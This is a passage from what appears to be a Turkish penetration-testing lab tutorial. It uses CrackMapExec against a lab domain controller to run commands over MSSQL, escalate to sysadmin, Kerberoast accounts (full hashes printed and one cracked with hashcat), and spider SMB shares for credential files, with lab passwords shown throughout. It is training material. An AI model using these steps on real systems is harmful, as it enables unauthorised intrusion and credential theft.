MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01 Volume in drive C has
no label.
MSSQL 10.129.203.121 1433 DC01 Volume Serial Number
is B8B3-0D72
MSSQL 10.129.203.121 1433 DC01 Directory of
c:\Users\Public
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> .
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> ..
MSSQL 10.129.203.121 1433 DC01 10/06/2021 02:38 PM
<DIR> Documents
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Downloads
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Music
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
3,456 passwd
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Pictures
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Videos
MSSQL 10.129.203.121 1433 DC01 1 File(s)
3,456 bytes
MSSQL 10.129.203.121 1433 DC01 7 Dir(s)
10,588,659,712 bytes free

```


Bir dosyayı indirmek için, `--get-file` seçeneğini kullanmamız ve ardından dosyanın yolunu ve bir çıktı dosyası adı belirlememiz gerekir.


### MSSQL aracılığıyla Hedef Makineden Dosya İndirme

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --get-file C:/Windows/System32/drivers/etc/hosts hosts

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy
C:/Windows/System32/drivers/etc/hosts to hosts
MSSQL 10.129.203.121 1433 DC01 [+] File
C:/Windows/System32/drivers/etc/hosts was transferred to hosts


cat hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
<SNIP>

```


### SQL Privilege Escalation **Module**

CrackMapExec, MSSQL için birkaç modül içerir, bunlardan biri **`mssql_priv`**'dir. Bu modül, MSSQL ayrıcalıklarını sıralar ve kullanarak bir standart kullanıcıdan sysadmin yetkilerine yükselmeye çalışır. Bunu başarmak için, bu modül MSSQL'deki iki (2) ayrıcalık yükseltme vektörünü sıralar: **`EXECUTE AS LOGIN`** ve **`db_owner rolü`**. Modülün üç seçeneği vardır: **`enum_privs`** (ayrıcalıkları listelemek için, varsayılan), **`privesc`** (ayrıcalıkları yükseltmek için) ve **`rollback`** (kullanıcıyı orijinal durumuna geri döndürmek için). Şimdi bunu nasıl çalıştığını görelim. Aşağıdaki örnekte, kullanıcı **`INLANEFREIGHT\robert`**, sysadmin yetkilerine sahip olan **`julio`**'yu taklit etme ayrıcalığına sahiptir.


### MSSQL Privilege Escalation

```
crackmapexec mssql -M mssql_priv --options
[*] mssql_priv module options:
 ACTION Specifies the action to perform:
 - enum_priv (default)
 - privesc
 - rollback (remove sysadmin privilege)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert is now a sysadmin! (Pwn3d!)

```

Bir sysadmin kullanıcısı olarak artık komutları çalıştırabiliriz. Bunu yapalım ve ardından ayrıcalıklarımızı orijinal durumlarına geri döndürelim


### Komutları Yürütme ve Ayrıcalıkları Geri Alma

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL_PR... 10.129.203.121 1433 DC01 [+] sysadmin role
removed
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
```


Not: Modülü sahip olduğumuz kullanıcılarla test etmek için, `--no-bruteforce` ve            `--continue-on-success` ile çoklu kullanıcı işlevselliği bir modülü aynı anda birden fazla hesapla test etmeyi desteklemediğinden, bunları tek tek denemek gerekir.


### Finding Kerberoastable Accounts

Kerberoasting saldırısı, tipik olarak bir servis hesabı olan `servicePrincipalName (SPN)` değerlerine sahip bir kullanıcıdan TGS (Ticket Granting Service) Biletleri toplamayı amaçlar. Herhangi bir geçerli Active Directory hesabı, herhangi bir SPN hesabı için bir TGS talep edebilir. Ticket'ın bir kısmı hesabın `NTLM parola hash'i` ile şifrelenir, bu da parolayı çevrimdışı olarak kırmayı denememize olanak tanır. 

Kerberoastable hesaplarını bulmak için, domain'de geçerli bir kullanıcıya sahip olmamız, `--kerberoasting` seçeneği ve ardından bir dosya adı ile LDAP protokolünü kullanmamız ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:


### Kerberoasting Attack

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
grace memberOf: CN=SQL Admins,CN=Users,DC=inlanefreight,DC=htb pwdLastSet:
2022-10-25 15:48:04.646233 lastLogon:2022-12-01 07:20:01.171413
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*grace$INLANEFREIGHT.HTB$inlanefreight.htb/grace*$ce19d59e7823
310c7fb51920d24bd56c$1cc46b764998c6077ee9a7f5a215a93bbae3b3a944584ac373823
a55c0d3e35600a91e0bd3c8b7e2366675dd10efb1c9fdde2d5dd46b1f6e346077daf4a3757
432921ae14c0801094c7fd2d0d50550c9a4924203e81272888ea1067f838cf306e6622102e
4ccc885158bd0515e7ec84fa5c6f660ce7045d41e16af7e8ece1878aef72e2605e4514b118
65bfbad3a4d788558395586ed4bbede9d0a2e106f4870bd2698f272b3ba30756fe84f44ab9
2ee92fbcd5b7cd66dd376f4ecb6f57f63ebfa2f8e0ff7794ce6a4bd9a49018b9bc64da5349
de833aff84d77ea5a1d6fdcb2b46986586e438535f3da26d077df2396d2b5d947a8bbfecbb
221c7babe2881558098adc70d68b9468257381eb0639a6a532486016167f3d246c10a43612
23b1c6f63fc9d34a749b2092a9b329761b7262259e22d8ff4a582d1f4b3c6627f5fa16684d
e5bdafb3fefca637f83eeede7d79542f470ad850c6e7f8141bdb6f2767f9ddbe81688f1e50
0fa59b09502eba8e733a3fd5548250299276b10365766c85a244ece2c9f0344f3b3b5953f1
31335596f5b91fcc365ba6ed4cab1ef2f72731d8b1e459fd69915df55c710d22e583712fd2
3999761411572089b0434782e05d364fb168eae1625b111e74351fd18ceb7186f14d25b533
d8c8b00dbbd5b0357e9e894fa65df8ef43bcd1547ab7a01f716a1c471b3e7df0f66c31e20e
e0e12d3d6f1deb859321a084fa819f7c8fc23cafa1cf6a19b4f65a7c7337e816b04bb1ef72
e45031493c9a0940519d53851beb2795d477f4c64a401eefc7a3541143df11ae983ba2ff3b
6d16580e23179bdece2fa9c4023dd71de199c94cbfbab166d0a64110e2522ff5f74c442ba0
439a72119835f0e01422d0f8cf758b9dc906074fab81957972732f60fc26d06af9170cf5f4
8531a5cf9cf63cd5cff0fad2f2e317588852c7df94954e2cb5b35e274de5976d33249e053c
f23d26f45f9c9fbd418b460b5a4cb0b11fabae91bdd2113798e5401891d514cf6525419eac
37b004487e83e6c50669d6560e07a753b86f4fb7535f3429a767e43f307dc3537eb3d808b4
fd517c0dcc6b8cf26cb1c978f67b349fa0e4699d1b2c7325f9d1d6cf31cfe6fbf8d837b0f5
d9b5265f9c3ccf9b79e9b88d6ab4a77297cd2866b732f1d4516541f556cd5c20dff46bfec4
56647159017bd34d02afe2f5baee661bfa48bcfccb08d8e835be6af48a17152811d9e03222
9c898df53082515a08c3962d4dca0dc262b758bc30fd18b36ecadc17d73141c03ae9deffcb
2c776305a1928e0addd709a2609192f8270be7ce38936a47f21f2b1eb5a6ed27e1c76719fc
83edffa5791064b8e77e643602fb6a459ae399ea48961e14125eba0fede24db448cfc42bb6
90bf0d7af80fedfb440e13e61a71996fcfe29c872add3d6189e085636c4eb2c480a171b121
5a43b438ff5ffccd6106e48e1b3
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
peter memberOf: CN=Remote Management
Users,CN=Builtin,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-26
06:55:58.364988 lastLogon:2022-10-26 14:45:08.305940
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$eb2c68e3a589
9ec32a9786b8ec58fe7d$f1baabf78434c380a2d7bba8c8cfae70fe520c6d7a710ee5f8754
c1d7fcaa77b66cf26f02d3a97e8a98c3443d1791418f26c181433be3f42673ab3accfb2ed9
ec3c67acc5269fcd31b327cc676ff3a482a7741f640e2f2918c31949297327e2c771e340a1
ed8859e95029001313d5b948041e6ad6e8fff55cfeb09fbdf3445295b939a94601b6f28af7
304fd2708f4f68f7568c69fce576bffe8f5db57def476123f89ea380917e5bc54e5e993717
b4949f4de5a0c44f5e40a359bb5945feda402cca16bd0a8d85a374f16bd061e64e2bc49d35
2fa504490260e9808e49daafef1c08390bc3f21ec3f5167a649ebb2a91b7021c9b6df26b1c
3bc68b2e53b94e9a09861ef26cc5aa1bfcdd543fa77d4b9428a2c8ef90f6d54388ed55bbad
930cea6193160ff58330ca083b095edab8e11ba0ce1c53a51a341222144f1f0bbf82169592
d6537b676c54955addb6bdd9e4361fc177bff5d2bf581f24a682c0f32dd381e0d657b5caea
b6e6b6bcffdab8e509a3f3af414ced94c9198915a0c880bea6c0b6a1818c88b24ab5c87984
889363ef5993a190266def79c5d3ddcfecfdd3263dc83a303db8ab000a3021c1b50844e5ae
796aa79620ff79bfe2b0347d04de8f14a48f6b4e970fdaf03efce818c13d7e7da068d9bbdc
af361d77d5907a4b672e327f17833b2cdee523dae8a878e8d3c273bd0038c66475d00c337a
c19df2fe8cc6e9e4e49335e30dbb4eebd3f9d24e762524d7ab6e36ab532a1924dc8a6e6049
99e8ed3736ea1f29a3758d22f982600a0523b56780364e892014879f56fe79ce21442a4509
cd548cdf180529ea283509bf8925b7d5275284994caef811731ba63b1cabd92368299e9364
f3bf4d77bb7a0aec6487d0cfd776b9ee234f170a387c72ebc06aca19ed31b6d86a9986634a
2aa3f538c51aea0db3efd26a8e7ed438c60cbb2cc5dcbb6e564c1364775f84ed9b49d65ec0
40c6e75d4e5182a26cd86d17197212331edb0d135e7e77d3ee3277164af500e0c61d6f598b
a1950868bf0cfd318547830a3faeb98fd40adccabd72b02733c90f8563326d65be4c707d68
a26d4482525bbb1084b816e83772b4098a5d54a22b4c7abbc3b32fa0e9b57a5e660ae8378b
f54e8b405a5cff00b3038bcabc40a089732de4c93a44c84446f82f19f5f17310d8963cff4c
ee063767cb8680a5edeec3b59fcaaa1df2e05432478028a6e9346c09685febbf28ed9cbe36
c2fcd3246f973dbc8bec55afdd0c36e140b34bd1203e61370dcdf2899ea0b88cfa6e5c562e
08214441b4ebe7eeec4053349682bd0424cddb5c601ba681daad100ae639730a058b7b6af5
fc5edade0f24ccac56183d01508a9fda7d7d14ccce48c9e86d3b188cd5cd67b400582b267a
1f745a700fad067fe55f5ccca3a8655aeb28af683f9d6ccdc2eeb06d1adc2c4056bccef814
f172dcf06f756648e4c4498ef57
```


Herhangi bir Kerberoastable hesabı varsa, CrackMapExec bunları çevrimdışı olarak kırmayı denememiz gereken `hash` ile birlikte görüntüler. Bizim durumumuzda, şifreyi kırmak için `rockyou.txt` kelime listesini ve Hashcat uygulamasını kullanacağız. 


### Cracking the Hash

```
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$026257d4f9aa
58cd5c654295eac8255f$22ea3062f1822e967934263b37ff1b565342b3934c2864b46366d
e7bf3e230d0cb08f605deae3053c6f93944256c409c9f352ac337c33f5c4ad8adf125cd686
3598d3a8c97ec60fb19c5e3691e825f95333509fbff9e2832d465ce2beee4f290bac2c52a2
ce625b613778a5ebebb668a2538cb547c0d0d5c45e455f5df03e08a054349fcd24e140dcb2
315f1af23e11ebe547556a24a200585353de9e6654ec71f205a3e37fa129bede32f0ca385d
fe7ff84cea07c8bc646147782cadb47e03b1a230c8f828a40a34d78d57513892fb1fee09a7
888be76738374fbd3baa2050572db461221c256abafafc92e6bfc84f8c5b0771c5bb1846f0
7b971089570b12bc8eb970a8da3f5d81f16a4353e86e8cf8ff77f834b6d9384d3e81058583
aef8d145427bbc772f9f56153b8bc075d73841e3592ae4da6533cefb28b20186d2df253787
10411b517b6bca5f9c1ddfed3e357a12f8ab677b963ca4aa16de76adb49068ee7d956e95ac
04c624fef3f288640ccd260c12dddfa2771b5582e1351af1d99aa2f185687cc1613b294430
8563afbc6d4caf9da56e61ccbf46359a3b50b1defdb8b54c4ddbcee0ce3a18b6b532ba7227
c0918795531726e773754ee35cf3ce5b5dcf89ed8b13dd2774e6c1342e77f3fcae92065761
95b4a48f845f193e8b949b499c14f0bf8086c73da821c183b8e9155e15e5295b7a05b49643
3a946fecd51730150f6655e761b56b3ce0ad27884888ef88b7fd1e2fc7dd7f113cc84c684a
976f43bdde4d3e6f8a20114da482c640dd83439b781bf6c00a73419720d1201bd5f3a9e883
27b87cb6cf37ee88b7d5e04d51a09994b350bcbb1e3d6345293773874e3771558fea92dae0
aa010e88372cd5520a06538c0a6c93584f6490601cc5cc1c6644974ad6e4103f027a7d3292
4c680679478f3228c54f171920cd48272d4fcbd014acaea185f5e219a00476d8a78abcd8c3
bdbad14f5850476c3eeb62f0817ffc5ff3467a01408c75a743a71045edfd329644683c0800
5c7abc83e8527209b9b621488e39e9b2e5baca8247020b7e53dc1f9efa40d7d70886affa05
90922641c31ace175df3a0ab7a8f989fa6bd7442b07b67a3d72faabec69f61a6d455d18544
979f844ca6b64d9c3487be207e8ee80b605a2abe09221382e6574fda9e39adf03ab3687152
af2fbb210728777b481dd7290731a0abecdfb63d72d9f9da6ac13e7b0363ab194a5e714df5
dbac2eabacfdd6666c736ee7d074720d0860c5ed8b5c937cd12188a18b2bef1511642b5b13
a4c5179e23e7867a9d5536e309100c8bc9a2a71b370a733fd9e972683138d08bbb5c923257
888efc51cef997b062fca914954d91cfab3e9aafccf051c208d4149b6abc26fd1c1cc2e630
a2f4fc0dae40e1b1ad2cd477b9feabdc9e696d43080438d9f1207b96ce7fc3a49739f4bc50
dee57553a661778ea14cf431a0e:Password123
<SNIP>

```

Hesabın parolasını aldıktan sonra, hesabın hala etkin olup olmadığını doğrulamamız gerekir. Bunu SMB protokolünü kullanarak yapabiliriz, çünkü normal bir domain kullanıcısı veya yönetici hesabı olarak kimlik doğrulaması yapmaya çalışacaktır.


### Testing the Account Credentials

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```

Bir sonraki bölümde, paylaşılan klasörlerde ilginç bilgiler aramak için bulduğumuz tüm aktif hesapları nasıl kullanabileceğimizi tartışacağız.

---

### Bir SMB Paylaşımında Spidering ve Önemli Bilgileri Bulma

Şirketlerin, insanlar ve departmanlar arasında işbirliğini sağlamak için bilgileri merkezi bir konumda depolaması gerekir. Genellikle bir departman, başka bir departmanın işlemesi gereken bilgileri işler. Şirketlerin bu tür bir işbirliğine izin vermesinin en yaygın yollarından biri paylaşılan klasörlerdir.

Erişim sağladığımız hesapları kullanarak paylaşım klasörlerine erişim talep etmek ve erişimleri olup olmadığını tespit etmek için `--shares` seçeneğini kullanabiliriz.


### Hesapların Paylaşılan Klasörlere Erişimi Olup Olmadığını Belirleme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 CertEnroll READ
Active Directory Certificate Services share
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
READ,WRITE
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
READ,WRITE
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON READ
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL READ
Logon server share
SMB 10.129.203.121 445 DC01 Users
```

Not: Bu modül yazılırken, CrackMapExec `--shares` seçeneği ile birden fazla kullanıcı adı ve parola sorgulamayı desteklemiyordu

`--shares` seçeneği, hedef makinedeki her bir paylaşımı ve kullanıcımızın bu paylaşımlar üzerinde hangi izinlere (READ/WRITE) sahip olduğunu gösterir. IT adlı ilginç bir klasöre okuma ve yazma erişimimiz var. [Impacket smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) kullanarak kolayca açabilir veya paylaşımı bağlayabiliriz. Yüzlerce paylaşımın içeriğini kontrol ederken elverişsiz hale gelebilir. Bu amaçla, CrackMapExec, `spider` seçeneği ve `spider_plus` modülü olmak üzere iki harika özellikle birlikte gelir.

Not: Domain'deki herhangi bir bilgisayarın bir paylaşımlı klasöre sahip olabileceğini unutmayın. Paylaşılan klasörleri bulmak için hedeflediğimiz ağda önceden tanımlanmış makineleri hedeflemeliyiz.


### The Spider Option

CrackMapExec'teki `--spider` seçeneği, remote bir paylaşım içinde arama yapmanıza ve aradığınız şeye bağlı olarak ilginç dosyalar bulmanıza olanak tanır. Örneğin, `--pattern` seçeneğini ve ardından aramak istediğimiz kelimeyi ekliyoruz, bu durumda `txt` ve içinde `txt` olan tüm dosyaları listeleyebiliriz (`test.txt,` a`txtb.csv`)

### “txt” İçeren Dosyaları Aramak için spider Seçeneğini Kullanma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT  --pattern txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Started spidering
SMB 10.129.203.121 445 DC01 [*] Spidering .
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/Creds.txt [lastm:'2022-10-31 11:16' size:54]
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/IPlist.txt [lastm:'2022-10-31 11:15' size:36]
<SNIP>
SMB 10.129.203.121 445 DC01 [*] Done spidering
(Completed in 1.7534186840057373)


```


Klasörler, dosya adları veya dosya içeriği üzerinde daha ayrıntılı aramalar yapmak için      `--regex [REGEX]` seçeneğiyle regex ifadeleri de kullanabiliriz. Aşağıdaki örnekte, paylaşılan IT klasöründeki herhangi bir dosya ve dizini görüntülemek için `--regex` . kullanalım:


### IT Paylaşımındaki Tüm Dosya ve Dizinleri Listele seçeneğini de kullanabiliriz


```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT -
-regex .

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/.
[dir]
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/..
[dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Documents [dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/IPlist.txt [lastm:'2022-12-01 09:01' size:36]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/passwd [lastm:'2022-12-19 11:28' size:3456]
SMB 10.129.204.177 445 DC01 
//10.129.204.177/IT/Documents/. [dir]
...SNIP...
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 1.593825340270996)
```


Dosya içeriğinde arama yapmak istiyorsak `--content` seçeneği ile bunu etkinleştirmemiz gerekir. “`Encrypt`” kelimesini içeren bir dosya arayalım.


### Dosya İçeriğini Arama

```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT  --content --regex Encrypt

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54 offset:54
regex:'b'Encrypt'']
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 3.5477945804595947)
```

Çok ilginç bilgiler içeren `Creds.txt` adlı ilginç bir dosya görebiliriz. CrackMapExec kullanarak remote bir dosyayı alabiliriz. Paylaşımı `--share SHARENAME` seçeneğini kullanarak belirtmemiz, ardından `--get-file` kullanmamız ve ardından dosyanın paylaşım içindeki yolunu kullanmamız ve bir çıktı dosyası adı belirlememiz gerekir.


### Paylaşılan Klasördeki Bir Dosyayı Alma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --
get-file Creds.txt Creds.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy Creds.txt to
Creds.txt
SMB 10.129.203.121 445 DC01 [+] File Creds.txt was
transferred to Creds.txt
```


```
cat Creds.txt
Creds Encrypted:
ZWxpZXNlcjpTdXBlckNvbXBsZXgwMTIxIzIK
```



Tersi durumda, remote bir paylaşıma bir dosya göndermek istediğimizi düşünün. `WRITE` ayrıcalıklarına sahip olduğumuz bir paylaşım bulmamız gerekir. Daha sonra `--get-file` ile yaptığımız gibi `--put-file` seçeneğini kullanabiliriz.

### Paylaşılan Klasöre Dosya Gönderme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT   --put-file /etc/passwd passwd

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy /etc/passwd
to passwd
SMB 10.129.203.121 445 DC01 [+] Created file
/etc/passwd on \\IT\passwd
```

Not: Büyük bir dosya aktarıyorsak ve başarısız olursa, tekrar denediğinizden emin olun. Hata almaya devam ederseniz, `--smb-timeout` seçeneğini varsayılan iki (2) değerinden daha büyük bir değerle eklemeyi deneyin.


### The spider_plus Module

Bazen bir paylaşımla karşılaşabiliriz ve onu bağlamadan veya **`smbclient.py`** kullanmadan uzantıyla ilgili tüm dosyaları hızlıca listelemek isteyebiliriz. CrackMapExec, bunu halledecek **`spider_plus`** adında bir modül ile gelir. Bu modül, varsayılan olarak **`/tmp/cme_spider_plus`** adlı bir klasör ve paylaşımla ilgili dosya bilgilerini içeren **`IP.json`** adlı bir JSON dosyası oluşturur. **`EXCLUDE_DIR`** modül seçeneğini kullanarak, araçtın **`IPC$`**, **`NETLOGON`**, **`SYSVOL`** gibi paylaşımları göz ardı etmesini sağlayabiliriz.


### Using the Module spider_plus

```
crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M
spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

```
{
  "IT": {
    "Creds.txt": {
      "atime_epoch": "2022-10-31 11:16:17",
      "ctime_epoch": "2022-10-31 11:15:17",
      "mtime_epoch": "2022-10-31 11:16:17",
      "size": "54 Bytes"
    },
    "IPlist.txt": {
      "atime_epoch": "2022-10-31 11:15:11",
      "ctime_epoch": "2022-10-31 11:14:52",
      "mtime_epoch": "2022-10-31 11:15:11",
      "size": "36 Bytes"
    }
  },
  "linux01": {
    "flag.txt": {
      "atime_epoch": "2022-10-05 10:17:02",
      "ctime_epoch": "2022-10-05 10:17:02",
      "mtime_epoch": "2022-10-11 11:44:14",
      "size": "52 Bytes"
    },
    "information-txt.csv": {
      "atime_epoch": "2022-10-31 15:00:58",
      "ctime_epoch": "2022-10-31 14:21:36",
      "mtime_epoch": "2022-10-31 15:00:58",
      "size": "284 Bytes"
    }
  }
}

```

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

```
ls -R /tmp/cme_spider_plus/10.129.203.121/
/tmp/cme_spider_plus/10.129.203.121/:
IT linux01

/tmp/cme_spider_plus/10.129.203.121/IT:
Creds.txt Documents IPlist.txt
...SNIP...

/tmp/cme_spider_plus/10.129.203.121/linux01:
flag.txt information-txt.csv
```

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

```
crackmapexec smb -M spider_plus --options

[*] spider_plus module options:
 READ_ONLY Only list files and put the name into a
JSON (default: True)
 EXCLUDE_EXTS Extension file to exclude (Default:
ico,lnk)
 EXCLUDE_DIR Directory to exclude (Default: print$)
